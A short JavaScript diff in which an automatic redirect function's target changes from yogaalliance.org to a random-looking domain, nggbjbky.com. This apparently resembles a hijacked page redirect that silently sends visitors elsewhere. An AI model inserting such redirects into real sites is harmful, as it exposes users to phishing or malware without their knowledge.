@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://yogaalliance.org";
+		var url="https://www.nggbjbky.com";
 		window.location=url;
 	}
 }
@@ -13,3 +13,4 @@ function getLoad()
 	num++;
 
 }
+
